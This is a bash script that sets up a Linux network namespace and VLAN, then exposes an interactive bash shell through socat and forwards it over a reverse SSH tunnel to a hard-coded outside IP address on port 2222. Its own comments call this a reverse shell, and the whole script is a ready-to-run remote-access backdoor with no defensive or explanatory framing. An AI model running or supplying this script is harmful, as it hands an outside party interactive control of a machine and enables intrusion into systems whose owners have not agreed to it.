#!/bin/bash

# Variables
NAMESPACE="mynamespace"          # Namespace name
VLAN_ID="100"                    # Starting VLAN ID
MAX_VLAN_ID_INCREMENT=5          # Maximum VLAN ID increment attempts
BASE_INTERFACE="eth0"            # Base network interface
REMOTE_HOST="172.245.6.230"      # Remote host to connect via SSH
REMOTE_PORT="2222"               # Remote SSH port
LOCAL_PORT="1234"                # Local port for reverse shell
GATEWAY_IP="192.168.100.1"       # Gateway IP for the namespace

# Clean up existing namespace if it exists
if ip netns list | grep -q "$NAMESPACE"; then
  echo "Namespace $NAMESPACE already exists. Deleting it..."
  ip netns del "$NAMESPACE"
fi

# 1. Create a network namespace
ip netns add "$NAMESPACE"

# 2. Loop to find an available VLAN ID
for (( i=0; i<=MAX_VLAN_ID_INCREMENT; i++ ))
do
  VLAN_INTERFACE="eth0.$((VLAN_ID + i))"
  
  # Check if the VLAN interface already exists
  if ip link show "$VLAN_INTERFACE" &> /dev/null; then
    echo "VLAN $VLAN_INTERFACE already exists, trying next VLAN ID..."
    continue
  fi

  # Attempt to create the VLAN
  echo "Creating VLAN $VLAN_INTERFACE..."
  ip link add link "$BASE_INTERFACE" name "$VLAN_INTERFACE" type vlan id "$((VLAN_ID + i))"
  if [ $? -eq 0 ]; then
    echo "VLAN $VLAN_INTERFACE created successfully."
    break
  else
    echo "Error creating VLAN $VLAN_INTERFACE."
    if [ $i -eq $MAX_VLAN_ID_INCREMENT ]; then
      echo "Reached maximum VLAN ID increment attempts. Exiting."
      ip netns del "$NAMESPACE"
      exit 1
    fi
  fi
done

# 3. Assign the VLAN to the namespace
ip link set "$VLAN_INTERFACE" netns "$NAMESPACE"
ip netns exec "$NAMESPACE" ip link set dev "$VLAN_INTERFACE" up
ip netns exec "$NAMESPACE" ip addr add 192.168.100.2/24 dev "$VLAN_INTERFACE"

# 4. Set up routing and default gateway inside the namespace
echo "Setting up default gateway via $GATEWAY_IP..."
ip netns exec "$NAMESPACE" ip route add default via "$GATEWAY_IP" dev "$VLAN_INTERFACE"

# 5. Test network connectivity within the namespace (debugging)
echo "Pinging remote host $REMOTE_HOST from within namespace..."
ip netns exec "$NAMESPACE" ping -c 4 "$REMOTE_HOST"
if [ $? -ne 0 ]; then
  echo "Network unreachable. Exiting."
  ip netns del "$NAMESPACE"
  exit 1
fi

# 6. Setup reverse shell with socat over SSH (runs within namespace)
ip netns exec "$NAMESPACE" socat tcp-l:$LOCAL_PORT,reuseaddr,fork exec:"bash -li" &
SOCAT_PID=$!
echo "Reverse shell set up on port $LOCAL_PORT within namespace $NAMESPACE."

# 7. Create a reverse SSH connection (from within the namespace)
ip netns exec "$NAMESPACE" ssh -R $REMOTE_PORT:localhost:$LOCAL_PORT -p $REMOTE_PORT "$REMOTE_HOST"
if [ $? -ne 0 ]; then
  echo "SSH connection failed."
  kill $SOCAT_PID
  ip netns del "$NAMESPACE"
  exit 1
fi

# 8. Clean up - Wait for the reverse shell process to finish
wait $SOCAT_PID

# 9. Remove the namespace after done
ip netns del "$NAMESPACE"
echo "Namespace $NAMESPACE removed and cleanup done."
